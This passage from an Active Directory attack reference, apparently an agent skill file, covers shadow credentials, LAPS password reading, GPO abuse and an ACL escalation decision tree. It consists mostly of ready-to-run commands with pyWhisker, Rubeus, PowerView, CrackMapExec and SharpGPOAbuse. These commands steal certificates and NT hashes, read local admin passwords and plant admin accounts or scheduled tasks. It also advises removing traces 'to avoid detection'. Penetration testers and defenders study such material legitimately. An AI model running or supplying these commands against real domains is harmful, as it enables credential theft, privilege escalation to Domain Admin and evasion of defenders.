# active-directory-acl-abuse technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 5. SHADOW CREDENTIALS

### Attack Flow

Write `msDS-KeyCredentialLink` on target → generate certificate → authenticate via PKINIT.

```bash
# pyWhisker (Linux)
pywhisker.py -d domain.com -u attacker -p pass --target victim --action add --dc-ip DC01
# Output: DeviceID and PFX file

# Authenticate with certificate
gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass RANDOM_PASS domain.com/victim victim.ccache
export KRB5CCNAME=victim.ccache

# Extract NT hash from TGT (for pass-the-hash)
getnthash.py -key AS_REP_KEY domain.com/victim
```

```powershell
# Whisker (Windows)
Whisker.exe add /target:victim /domain:domain.com /dc:DC01.domain.com
# → Provides Rubeus command to get TGT
Rubeus.exe asktgt /user:victim /certificate:CERT_B64 /password:PASS /ptt
```

**Cleanup**: Remove the added key credential to avoid detection.

---

## 6. LAPS PASSWORD READING

```powershell
# PowerView
Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# AD Module
Get-ADComputer -Identity TARGET -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd

# LAPS v2 (Windows LAPS)
Get-LapsADPassword -Identity TARGET -AsPlainText

# CrackMapExec
crackmapexec ldap DC01 -u user -p pass --module laps
```

---

## 7. GPO ABUSE

### Identify Writable GPOs

```powershell
# PowerView — find GPOs where you have write access
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite') -and
    ($_.SecurityIdentifier -match 'YOUR_SID')
}
```

### Exploit via SharpGPOAbuse

```cmd
# Add local admin via GPO
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount lowpriv --GPOName "Vulnerable GPO"

# Add scheduled task via GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\admin --Command "cmd.exe" --Arguments "/c net localgroup administrators lowpriv /add" --GPOName "Vulnerable GPO"

# Add startup script
SharpGPOAbuse.exe --AddComputerScript --ScriptName "evil.bat" --ScriptContents "net localgroup administrators lowpriv /add" --GPOName "Vulnerable GPO"
```

```bash
# pyGPOAbuse (Linux)
pygpoabuse.py DOMAIN/user:pass -gpo-id "GPO_GUID" -command "net localgroup administrators lowpriv /add" -dc-ip DC01
```

---

## 8. ACL ATTACK DECISION TREE

```
Have domain user access — want to escalate via ACL
│
├── Run BloodHound → analyze shortest paths to DA
│   └── Upload data → "Shortest Paths to Domain Admins from Owned Principals"
│
├── Direct ACL on user object?
│   ├── GenericAll → force password change, shadow creds, or targeted kerberoast (§3)
│   ├── GenericWrite → shadow credentials or set SPN (§3/§5)
│   ├── ForceChangePassword → reset password directly (§3)
│   ├── WriteDACL → grant yourself GenericAll, then exploit (§3)
│   └── WriteOwner → take ownership → WriteDACL → GenericAll (§3)
│
├── ACL on group?
│   ├── AddMember / GenericAll → add self to privileged group (§3)
│   └── WriteDACL → grant AddMember, then add self
│
├── ACL on computer object?
│   ├── GenericAll/GenericWrite → RBCD attack (§3)
│   ├── AllExtendedRights → read LAPS password (§6)
│   └── GenericWrite → shadow credentials on machine (§5)
│
├── ACL on domain object?
│   ├── WriteDACL → grant DCSync rights to self (§4)
│   └── Replication rights already? → DCSync directly (§4)
│
├── ACL on GPO linked to privileged OU?
│   └── Write access → add admin / scheduled task via GPO (§7)
│
└── Complex multi-hop chain?
    └── Load BLOODHOUND_PATHS.md for Cypher queries and chain analysis
```
